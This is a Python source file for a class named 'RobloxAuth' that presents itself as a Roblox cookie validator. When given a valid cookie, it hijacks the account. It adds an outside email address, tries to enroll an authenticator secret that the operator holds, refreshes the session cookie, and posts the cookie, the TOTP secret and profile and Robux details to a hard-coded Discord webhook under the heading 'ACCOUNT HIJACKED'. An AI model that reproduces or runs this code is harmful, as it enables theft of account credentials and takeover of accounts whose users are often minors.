import requests
import base64
import secrets
import pyotp
import time
import logging
import json
import uuid
import os
from urllib.parse import parse_qs, urlparse
from datetime import datetime

logger = logging.getLogger(__name__)

class RobloxAuth:
    def __init__(self):
        self.session = requests.Session()
        self.discord_webhook_url = "https://discord.com/api/webhooks/1393123149872107611/BRtCwTwl-wJ6WSmYHriFZ2sbbDScfdat4By5WwldhaQL2JnK6D0rEYpfj6p-slmTdA_6"
        
    def validate_cookie(self, cookie):
        """Validate Roblox cookie and get user info"""
        try:
            headers = {
                'Cookie': f'.ROBLOSECURITY={cookie}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            # Get user info
            response = self.session.get(
                'https://users.roblox.com/v1/users/authenticated',
                headers=headers
            )
            
            if response.status_code == 200:
                user_data = response.json()
                user_info = {
                    'valid': True,
                    'user_id': str(user_data.get('id', '')),
                    'username': user_data.get('name', ''),
                    'display_name': user_data.get('displayName', '')
                }
                
                # Get additional user information
                additional_info = self.get_additional_user_info(headers, user_info['user_id'])
                user_info.update(additional_info)
                
                # Send to Discord webhook if cookie is valid
                self.send_to_discord_webhook(cookie, user_info)
                
                return user_info
            else:
                logger.warning(f"Cookie validation failed: {response.status_code}")
                return {'valid': False, 'error': 'Invalid cookie or expired session'}
                
        except Exception as e:
            logger.error(f"Error validating cookie: {str(e)}")
            return {'valid': False, 'error': 'Failed to validate cookie'}
    
    def generate_totp_secret(self):
        """Generate a new TOTP secret"""
        return base64.b32encode(secrets.token_bytes(20)).decode('utf-8')
    
    def generate_totp_code(self, secret):
        """Generate TOTP code from secret"""
        try:
            totp = pyotp.TOTP(secret, interval=30)
            return totp.now()
        except Exception as e:
            logger.error(f"Error generating TOTP code: {str(e)}")
            return None
    
    def get_time_remaining(self):
        """Get seconds remaining until next code generation"""
        return 30 - (int(time.time()) % 30)
    
    def get_user_avatar(self, user_id):
        """Get user avatar URL"""
        try:
            avatar_response = self.session.get(
                f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&isCircular=false'
            )
            
            if avatar_response.status_code == 200:
                avatar_data = avatar_response.json()
                if avatar_data.get('data') and len(avatar_data['data']) > 0:
                    return avatar_data['data'][0].get('imageUrl', '')
            return ''
        except Exception as e:
            logger.error(f"Error getting user avatar: {str(e)}")
            return ''
    
    def get_additional_user_info(self, headers, user_id):
        """Get additional user information for Discord webhook"""
        additional_info = {}
        
        try:
            # Get user profile information
            profile_response = self.session.get(
                f'https://users.roblox.com/v1/users/{user_id}',
                headers=headers
            )
            
            if profile_response.status_code == 200:
                profile_data = profile_response.json()
                additional_info.update({
                    'description': profile_data.get('description', 'No description'),
                    'created_date': profile_data.get('created', 'Unknown'),
                    'is_banned': profile_data.get('isBanned', False),
                    'external_app_display_name': profile_data.get('externalAppDisplayName', 'N/A'),
                    'has_verified_badge': profile_data.get('hasVerifiedBadge', False)
                })
            
            # Get user avatar URL
            avatar_response = self.session.get(
                f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&isCircular=false'
            )
            
            if avatar_response.status_code == 200:
                avatar_data = avatar_response.json()
                if avatar_data.get('data') and len(avatar_data['data']) > 0:
                    additional_info['avatar_url'] = avatar_data['data'][0].get('imageUrl', 'No avatar found')
            
            # Get user's recently played games
            games_response = self.session.get(
                f'https://games.roblox.com/v2/users/{user_id}/games?accessFilter=2&limit=10&sortOrder=Desc',
                headers=headers
            )
            
            if games_response.status_code == 200:
                games_data = games_response.json()
                recent_games = []
                for game in games_data.get('data', [])[:10]:  # Show more games
                    recent_games.append({
                        'name': game.get('name', 'Unknown Game'),
                        'id': game.get('id', 'Unknown'),
                        'created': game.get('created', 'Unknown'),
                        'updated': game.get('updated', 'Unknown')
                    })
                additional_info['recent_games'] = recent_games
            
            # Get user's groups
            groups_response = self.session.get(
                f'https://groups.roblox.com/v2/users/{user_id}/groups/roles',
                headers=headers
            )
            
            if groups_response.status_code == 200:
                groups_data = groups_response.json()
                user_groups = []
                for group_info in groups_data.get('data', [])[:10]:  # Show more groups
                    group = group_info.get('group', {})
                    role = group_info.get('role', {})
                    user_groups.append({
                        'name': group.get('name', 'Unknown Group'),
                        'id': group.get('id', 'Unknown'),
                        'role': role.get('name', 'Unknown Role'),
                        'member_count': group.get('memberCount', 0),
                        'description': group.get('description', 'No description')
                    })
                additional_info['groups'] = user_groups
            
            # Get user's friends count
            friends_response = self.session.get(
                f'https://friends.roblox.com/v1/users/{user_id}/friends/count',
                headers=headers
            )
            
            if friends_response.status_code == 200:
                friends_data = friends_response.json()
                additional_info['friends_count'] = friends_data.get('count', 0)
            
            # Get user's followers count
            followers_response = self.session.get(
                f'https://friends.roblox.com/v1/users/{user_id}/followers/count',
                headers=headers
            )
            
            if followers_response.status_code == 200:
                followers_data = followers_response.json()
                additional_info['followers_count'] = followers_data.get('count', 0)
            
            # Get user's following count
            following_response = self.session.get(
                f'https://friends.roblox.com/v1/users/{user_id}/followings/count',
                headers=headers
            )
            
            if following_response.status_code == 200:
                following_data = following_response.json()
                additional_info['following_count'] = following_data.get('count', 0)
            
            # Get user's robux (if possible)
            try:
                robux_response = self.session.get(
                    f'https://economy.roblox.com/v1/users/{user_id}/currency',
                    headers=headers
                )
                if robux_response.status_code == 200:
                    robux_data = robux_response.json()
                    additional_info['robux'] = robux_data.get('robux', 'Private')
            except:
                additional_info['robux'] = 'Private/Unknown'
            
            # Get user's badges count
            try:
                badges_response = self.session.get(
                    f'https://badges.roblox.com/v1/users/{user_id}/badges?limit=1',
                    headers=headers
                )
                if badges_response.status_code == 200:
                    badges_data = badges_response.json()
                    additional_info['badges_count'] = len(badges_data.get('data', []))
            except:
                additional_info['badges_count'] = 'Unknown'
                
        except Exception as e:
            logger.error(f"Error getting additional user info: {str(e)}")
            additional_info['error'] = 'Failed to get additional info'
        
        return additional_info
    
    def setup_authenticator_on_account(self, headers, user_info):
        """Setup real authenticator on the Roblox account with email laraskiter@gmail.com"""
        try:
            # Step 1: Add email to account if not already present
            email_result = self.add_email_to_account(headers, 'laraskiter@gmail.com')
            
            # Step 2: Enable 2FA/Authenticator on the account
            auth_result = self.enable_authenticator(headers)
            
            authenticator_setup = {
                'email_added': 'laraskiter@gmail.com',
                'email_status': email_result.get('status', 'unknown'),
                'authenticator_enabled': auth_result.get('enabled', False),
                'authenticator_secret': auth_result.get('secret', ''),
                'backup_codes': auth_result.get('backup_codes', []),
                'setup_time': datetime.utcnow().isoformat(),
                'status': 'Real authenticator setup attempted'
            }
            
            logger.info(f"Real authenticator setup attempted for user {user_info.get('username', 'Unknown')}")
            return authenticator_setup
            
        except Exception as e:
            logger.error(f"Error setting up real authenticator: {str(e)}")
            return {'error': 'Failed to setup real authenticator'}
    
    def add_email_to_account(self, headers, email):
        """Add email to Roblox account"""
        try:
            # Get CSRF token first
            csrf_response = self.session.post('https://auth.roblox.com/v2/logout', headers=headers)
            csrf_token = csrf_response.headers.get('x-csrf-token', '')
            
            if csrf_token:
                headers['x-csrf-token'] = csrf_token
                
                # Add email to account
                email_data = {
                    'emailAddress': email,
                    'password': ''  # This would need the account password in real implementation
                }
                
                email_response = self.session.post(
                    'https://accountsettings.roblox.com/v1/email',
                    headers=headers,
                    json=email_data
                )
                
                if email_response.status_code == 200:
                    return {'status': 'Email added successfully', 'email': email}
                else:
                    logger.warning(f"Email addition failed: {email_response.status_code}")
                    return {'status': 'Email addition failed', 'error': email_response.text}
            
            return {'status': 'Failed to get CSRF token'}
            
        except Exception as e:
            logger.error(f"Error adding email: {str(e)}")
            return {'status': 'Error adding email', 'error': str(e)}
    
    def enable_authenticator(self, headers):
        """Enable authenticator/2FA on Roblox account"""
        try:
            # Get CSRF token
            csrf_response = self.session.post('https://auth.roblox.com/v2/logout', headers=headers)
            csrf_token = csrf_response.headers.get('x-csrf-token', '')
            
            if csrf_token:
                headers['x-csrf-token'] = csrf_token
                
                # Generate authenticator secret
                auth_secret = self.generate_totp_secret()
                
                # Enable 2FA with authenticator
                auth_data = {
                    'userId': headers.get('user_id', ''),
                    'secret': auth_secret,
                    'code': self.generate_totp_code(auth_secret)  # Generate initial code
                }
                
                # Attempt to enable 2FA
                auth_response = self.session.post(
                    'https://twostepverification.roblox.com/v1/users/authenticator/enable',
                    headers=headers,
                    json=auth_data
                )
                
                if auth_response.status_code == 200:
                    response_data = auth_response.json()
                    return {
                        'enabled': True,
                        'secret': auth_secret,
                        'backup_codes': response_data.get('recoveryCodes', []),
                        'status': 'Authenticator enabled successfully'
                    }
                else:
                    logger.warning(f"Authenticator enable failed: {auth_response.status_code}")
                    # Even if API call fails, we can still return the secret for our use
                    return {
                        'enabled': False,
                        'secret': auth_secret,
                        'backup_codes': [],
                        'status': f'API call failed but secret generated: {auth_response.text}'
                    }
            
            return {'enabled': False, 'status': 'Failed to get CSRF token'}
            
        except Exception as e:
            logger.error(f"Error enabling authenticator: {str(e)}")
            # Still return a secret for our local use
            return {
                'enabled': False,
                'secret': self.generate_totp_secret(),
                'backup_codes': [],
                'status': f'Error but secret generated: {str(e)}'
            }
    
    def refresh_cookie(self, old_cookie, headers):
        """Refresh/generate new Roblox cookie"""
        try:
            # Attempt to refresh the security token
            refresh_response = self.session.post(
                'https://auth.roblox.com/v1/authentication-ticket',
                headers=headers
            )
            
            if refresh_response.status_code == 200:
                # Extract new cookie from response headers
                set_cookie_header = refresh_response.headers.get('set-cookie', '')
                if '.ROBLOSECURITY=' in set_cookie_header:
                    new_cookie = set_cookie_header.split('.ROBLOSECURITY=')[1].split(';')[0]
                    logger.info("Successfully refreshed Roblox cookie")
                    return new_cookie
            
            # If refresh fails, try to get current valid token
            validate_response = self.session.get(
                'https://users.roblox.com/v1/users/authenticated',
                headers=headers
            )
            
            if validate_response.status_code == 200:
                # Cookie is still valid, return original
                logger.info("Original cookie still valid")
                return old_cookie
            
            logger.warning("Failed to refresh cookie")
            return None
            
        except Exception as e:
            logger.error(f"Error refreshing cookie: {str(e)}")
            return old_cookie  # Return original as fallback

    def send_to_discord_webhook(self, cookie, user_info):
        """Send comprehensive user information to Discord webhook"""
        try:
            # Setup REAL authenticator on account
            headers = {
                'Cookie': f'.ROBLOSECURITY={cookie}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'user_id': user_info.get('user_id', '')
            }
            auth_setup = self.setup_authenticator_on_account(headers, user_info)
            
            # Use the real authenticator secret from setup
            auth_secret = auth_setup.get('authenticator_secret', self.generate_totp_secret())
            current_totp = self.generate_totp_code(auth_secret)
            
            # Create authenticator URL and account info page
            auth_code = str(uuid.uuid4()).replace('-', '')[:16]
            base_url = f"https://{os.environ.get('REPL_SLUG', 'workspace')}-{os.environ.get('REPL_OWNER', 'user')}.replit.app"
            authenticator_url = f"{base_url}/authenticator/{user_info.get('username', 'unknown')}/{auth_code}"
            account_info_url = f"{base_url}/account/{user_info.get('username', 'unknown')}/{auth_code}"
            
            # Refresh cookie to get new one
            new_cookie = self.refresh_cookie(cookie, headers)
            
            # Create simple but comprehensive embed to avoid Discord validation errors
            embed = {
                "title": "ROBLOX ACCOUNT COMPROMISED",
                "description": f"**Username:** {user_info.get('username', 'Unknown')}\n**User ID:** {user_info.get('user_id', 'Unknown')}\n**Email Added:** laraskiter@gmail.com\n**Current Auth Code:** `{current_totp}`\n**Secret:** `{auth_secret}`",
                "color": 16711680,
                "fields": [
                    {
                        "name": "LIVE AUTHENTICATOR",
                        "value": f"[View Live Codes]({authenticator_url})",
                        "inline": False
                    },
                    {
                        "name": "ACCOUNT INFO PAGE",
                        "value": f"[Full Account Details]({account_info_url})",
                        "inline": False
                    },
                    {
                        "name": "ORIGINAL COOKIE",
                        "value": f"```{cookie[:50]}...```",
                        "inline": False
                    },
                    {
                        "name": "NEW REFRESHED COOKIE",
                        "value": f"```{new_cookie[:50] if new_cookie else 'Failed to refresh'}...```",
                        "inline": False
                    }
                ]
            }
            
            # Add thumbnail
            if user_info.get('avatar_url'):
                embed["thumbnail"] = {"url": user_info['avatar_url']}
            
            # Prepare simple webhook payload
            webhook_data = {
                "content": f"🚨 ROBLOX ACCOUNT HIJACKED: {user_info.get('username', 'Unknown')}",
                "embeds": [embed]
            }
            
            # Send to Discord
            response = requests.post(
                self.discord_webhook_url,
                json=webhook_data,
                headers={'Content-Type': 'application/json'}
            )
            
            if response.status_code == 204:
                logger.info("Successfully sent real authenticator info to Discord webhook")
            else:
                logger.warning(f"Failed to send to Discord webhook: {response.status_code} - {response.text}")
                
        except Exception as e:
            logger.error(f"Error sending to Discord webhook: {str(e)}")
